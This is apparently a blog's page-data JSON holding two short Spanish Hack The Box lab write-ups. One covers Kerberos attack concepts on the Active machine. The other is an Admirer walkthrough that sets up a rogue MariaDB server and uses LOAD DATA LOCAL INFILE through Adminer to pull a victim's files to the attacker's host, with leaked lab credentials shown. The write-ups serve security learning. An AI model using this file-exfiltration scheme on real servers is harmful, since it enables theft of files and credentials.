{"componentChunkName":"component---node-modules-gatsby-theme-portfolio-minimal-src-templates-article-listing-index-tsx","path":"/blog/","result":{"pageContext":{"articles":[{"banner":{"alt":"Microsoft Windows Icon","caption":"Photo by <a href=\"https://unsplash.com/@stadsa\">Tadas Sar</a> onUnsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAcIAwX/xAAXAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAGNenLbFKyEUaL/xAAaEAADAQADAAAAAAAAAAAAAAACAwUEAAEG/9oACAEBAAEFAsDULVboGteisgO/NUzq83qKcoqzmH//xAAYEQADAQEAAAAAAAAAAAAAAAAAUfARkf/aAAgBAwEBPwFSMuH/xAAZEQACAwEAAAAAAAAAAAAAAAAAARGB8JH/2gAIAQIBAT8BSWojcP/EACcQAAMAAQIEBgMBAAAAAAAAAAECAwQFEgAREyEGFCIjMjMVQVFx/9oACAEBAAY/Ao5scrw74grqDhPwi5eQMhHZjQrN4iqRTHn6qUyJzE9n2szANTCnpet4GZfHqZY+Drfn8NpgBKO4elLwgu/kSMdKN9cfc5cTm+qaUplGc9t9CXHogQcgpmzQI5fr2/8ASTzPDY+di4VVO1S/Q21YKdy83Vx8W9Q7dm7jiuTgZOTjPy2sOr5hKTXuknGYMk9OZ3GaKyhS7kfLh65EMXLtZuo1Miblh6VUIgSk0SahRtUL/T3JPH//xAAYEAEBAQEBAAAAAAAAAAAAAAABESEAMf/aAAgBAQABPyEUjuCPKeFTjq+PueIQCptdBkFvzmqxbESFOcL0MKRe0BHAgSTjuXz0NBsgXCp470K1AZjh4VFB/9oADAMBAAIAAwAAABDIz//EAB0RAAICAQUAAAAAAAAAAAAAAAERMWEAIVGBkbH/2gAIAQMBAT8QIJYltGLBSlrWEWYna/DHQ4//xAAcEQACAgIDAAAAAAAAAAAAAAABESExAMFhcfD/2gAIAQIBAT8QNKVLqGG7DkhrAwBECFe3Ppf/xAAYEAEBAQEBAAAAAAAAAAAAAAABABEhQf/aAAgBAQABPxDGSn/nQRtfbb5B4J9HXJ8au9aUHodwbEmhJi6Q9CDZRm+BMLyXh8byxCiUOYAlKJhVrKa//9k="},"images":{"fallback":{"src":"/static/ca216dba721b682d232715f47e9aae6c/91671/windows.jpg","srcSet":"/static/ca216dba721b682d232715f47e9aae6c/7e3b4/windows.jpg 165w,\n/static/ca216dba721b682d232715f47e9aae6c/47f88/windows.jpg 330w,\n/static/ca216dba721b682d232715f47e9aae6c/91671/windows.jpg 660w,\n/static/ca216dba721b682d232715f47e9aae6c/5aaff/windows.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/ca216dba721b682d232715f47e9aae6c/322ad/windows.webp 165w,\n/static/ca216dba721b682d232715f47e9aae6c/de3b3/windows.webp 330w,\n/static/ca216dba721b682d232715f47e9aae6c/2b2b5/windows.webp 660w,\n/static/ca216dba721b682d232715f47e9aae6c/e36a7/windows.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h2>Que aprendi de la maquina Active</h2>\n<ul>\n<li>Service Principal Name or SPNs</li>\n</ul>\n<p>Kerberos tiene dos puntos que podemos atacar</p>\n<ul>\n<li>AS_REP roasting, cuentas con flag \"DONT_REQUIERE_PREAUTH\" activada</li>\n<li>Kerberosting, SPNs para decifrar hash NTLM</li>\n</ul>\n<blockquote>\n<p>En AD las cuentas vinculadas a servicios (SPNs) son objetivos de alto interes porque los servicios suelen correr con privilegios.</p>\n</blockquote>\n<h3>Cuentas ejecutando servicios</h3>\n<p>En Windows, un servicio utiliza cuentas para correr servicios porque es como correr Apache o Nginx en Linux con una cuenta www-data.</p>\n<p>Algunas cuentas para correr servicios pueden ser:</p>\n<ul>\n<li>Con LocalSystem</li>\n<li>Con NetworkService</li>\n<li>Con una cuenta dedicada\n<ul>\n<li>Cualquier cuenta de usuario, incluso Administrator.</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>krbtgt lleva SPN, pero no es kerberoasteable. Es una cuenta interna del dominio usada por Kerberos. No es “un servicio normal”, es parte del propio protocolo Kerberos.</p>\n</blockquote>\n<h3>Relacionando Objetos, Cuentas y Servicios</h3>\n<p>El campo sAMAccountName muestra la cuenta real, \"dn\" muestra el objeto que guarda la cuenta, detras de la barra el servicio y su puerto asociado (active/CIFS:445), y lo que relaciona el sAMAccountName con el servicePrincipalName (SPN) es el objeto (\"dn: CN=Administrator,CN=Users,DC=active,DC=htb\").</p>","categories":["AD","Theory","Basic"],"date":"November 16, 2025","description":"Active Directory","id":"02606818-e360-50c5-a4db-153a951d8535","keywords":["AD","Theory","Basic"],"slug":"/htb-active/","title":"HTB Active","readingTime":{"text":"1 min read"}},{"banner":{"alt":"Database typical icon","caption":"Photo by <a href=\"https://unsplash.com/@sunder_2k25\">Sunder Muthukumaran</a> on Unsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAUBBwgJ/8QAFAEBAAAAAAAAAAAAAAAAAAAABf/aAAwDAQACEAMQAAAB7J1PqaXQ14wAnP/EABsQAAMAAgMAAAAAAAAAAAAAAAECBQADBAYQ/9oACAEBAAEFAuxvv48uHa30KQTBgVR5/8QAHxEAAQQCAgMAAAAAAAAAAAAABAECAxMFERIiECEx/9oACAEDAQE/ATsRKXkgj2HPgjGqtGSLkhFUqyt72N4bV2l6P9fPH//EAB4RAAEDBAMAAAAAAAAAAAAAABMCAwQBBRESECFh/9oACAECAQE/AYV2jRbbKhO25Mh58wZRxhMylquWgrJprunDiO6494//xAAfEAACAgEFAQEAAAAAAAAAAAABAgMRIQAEEBIxEyL/2gAIAQEABj8C3EkMbuY/m5+aszBVlUs3VbalGWrwWdbWGMSSBe7SUrlUURtmQ+Lmh+skkDXnGFAv2scf/8QAHBABAQACAgMAAAAAAAAAAAAAAREAITFhEEFR/9oACAEBAAE/IXK5JPIFKEDHgFxFIIBTtJ0FAQK5UF2968OxtDZ+s5e245//2gAMAwEAAgADAAAAEKMP/8QAGBEBAQADAAAAAAAAAAAAAAAAAREQITH/2gAIAQMBAT8QTisMY+98O6JA3H//xAAYEQEAAwEAAAAAAAAAAAAAAAABABEhMf/aAAgBAgEBPxBvhNWu7Ro0aqgtP//EABsQAQACAwEBAAAAAAAAAAAAAAERIQAxQXHw/9oACAEBAAE/EId+boJd1TMaZVKbqQ1PG3BQzalOG/vuZYvZDJIinERPRG3B1kLBglgYBSwCFbtxQhA109z/2Q=="},"images":{"fallback":{"src":"/static/86dbe869c88a7efb3fc747229c96e82e/91671/database.jpg","srcSet":"/static/86dbe869c88a7efb3fc747229c96e82e/7e3b4/database.jpg 165w,\n/static/86dbe869c88a7efb3fc747229c96e82e/47f88/database.jpg 330w,\n/static/86dbe869c88a7efb3fc747229c96e82e/91671/database.jpg 660w,\n/static/86dbe869c88a7efb3fc747229c96e82e/5aaff/database.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/86dbe869c88a7efb3fc747229c96e82e/322ad/database.webp 165w,\n/static/86dbe869c88a7efb3fc747229c96e82e/de3b3/database.webp 330w,\n/static/86dbe869c88a7efb3fc747229c96e82e/2b2b5/database.webp 660w,\n/static/86dbe869c88a7efb3fc747229c96e82e/e36a7/database.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Que aprendi de la maquina Admirer</h1>\n<h2>Abuso del DB-client llamado Adminer</h2>\n<p>Aqui vemos tres cosas,</p>\n<ol>\n<li>si encontramos un cliente remoto podemos hacer que se conecte a nosotros,</li>\n<li>haciendo eso logramos un entorno remoto donde ejecutar Queries o intentar cosas,</li>\n<li>si el cliente remoto permite ejecutar funciones peligrosas podriamos intentar leer archivos locales del host remoto\n<ol>\n<li>(esto es similar a lo que hacemos cuando un host-PHP nos permite ejecutar funciones como shell_exec).</li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>Digamos que no es vulnerable sino \"abusable\" ya que su configuracion permite el uso de funciones que podemos abusar.</p>\n</blockquote>\n<h3>Ejemplo (Accedemos a un archivo y lo guardamos en una tabla para poder leerlo)</h3>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'../index.php'</span>\n<span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">.</span>shit\n<span class=\"token keyword\">FIELDS</span> <span class=\"token keyword\">TERMINATED</span> <span class=\"token keyword\">BY</span> <span class=\"token string\">\"\\n\"</span></code></pre></div>\n<p>Esquema de Ataque</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token comment\">-- Attacker (creamos tabla, usuario y configuramos servicio)</span>\n<span class=\"token comment\">-- # tabla y usuario</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">DATABASE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">USE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> shit <span class=\"token punctuation\">(</span>name <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">USER</span> <span class=\"token string\">'some'</span><span class=\"token variable\">@'10.10.10.187'</span> IDENTIFIED <span class=\"token keyword\">BY</span> <span class=\"token string\">'some123*'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">GRANT</span> <span class=\"token keyword\">ALL</span> <span class=\"token keyword\">PRIVILEGES</span> <span class=\"token keyword\">ON</span> <span class=\"token keyword\">backup</span><span class=\"token punctuation\">.</span><span class=\"token operator\">*</span> <span class=\"token keyword\">TO</span> <span class=\"token string\">'some'</span><span class=\"token variable\">@'10.10.10.187'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- # servicio</span>\n<span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>mysql<span class=\"token operator\">/</span>mariadb<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span>d<span class=\"token operator\">/</span><span class=\"token number\">50</span><span class=\"token operator\">-</span>server<span class=\"token punctuation\">.</span>cnf\nbind<span class=\"token operator\">-</span>address <span class=\"token operator\">=</span> <span class=\"token number\">10.10</span><span class=\"token number\">.14</span><span class=\"token number\">.2</span>\n<span class=\"token comment\">-- # opcional: firewall (allow)</span>\nufw allow <span class=\"token keyword\">from</span> <span class=\"token number\">10.10</span><span class=\"token number\">.10</span><span class=\"token number\">.187</span> <span class=\"token keyword\">to</span> <span class=\"token keyword\">any</span> port <span class=\"token number\">3306</span>\n<span class=\"token comment\">-- # restart servicio </span>\nsystemctl restart mariadb\n\n<span class=\"token comment\">-- Victim</span>\n<span class=\"token comment\">-- # DB-Client</span>\nServer: <span class=\"token operator\">&lt;</span>attacker<span class=\"token operator\">-</span>ip<span class=\"token operator\">></span>\nUsername: <span class=\"token keyword\">some</span>\nPassword: some123<span class=\"token operator\">*</span>\n<span class=\"token keyword\">Database</span>: <span class=\"token keyword\">some</span>\n<span class=\"token comment\">-- # Query</span>\n<span class=\"token keyword\">LOAD</span> <span class=\"token keyword\">DATA</span> <span class=\"token keyword\">LOCAL</span> <span class=\"token keyword\">INFILE</span> <span class=\"token string\">'../index.php'</span>\n<span class=\"token keyword\">INTO</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">some</span><span class=\"token punctuation\">.</span>shit\n<span class=\"token keyword\">FIELDS</span> <span class=\"token keyword\">TERMINATED</span> <span class=\"token keyword\">BY</span> <span class=\"token string\">\"\\n\"</span> <span class=\"token comment\">-- # permite que cada linea se guarde en una row de la tabla</span>\n<span class=\"token comment\">-- # La informacion esta disponible en database.tabla</span>\n <span class=\"token keyword\">row</span>:\t  <span class=\"token operator\">&lt;</span>?php\n <span class=\"token keyword\">row</span>:\t  $username <span class=\"token operator\">=</span> <span class=\"token string\">\"waldo\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">row</span>:\t  $password <span class=\"token operator\">=</span> <span class=\"token string\">\"&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">row</span>:\t  $dbname <span class=\"token operator\">=</span> <span class=\"token string\">\"admirerdb\"</span><span class=\"token punctuation\">;</span></code></pre></div>","categories":["DB","Theory","Basic"],"date":"November 15, 2025","description":"Base de Datos","id":"1c33e46c-14cf-5fa3-984d-c43f2268c043","keywords":["DB","Theory","Basic"],"slug":"/htb-admirer/","title":"HTB Admirer","readingTime":{"text":"2 min read"}}]}},"staticQueryHashes":["3262260831","948380417"],"slicesMap":{}}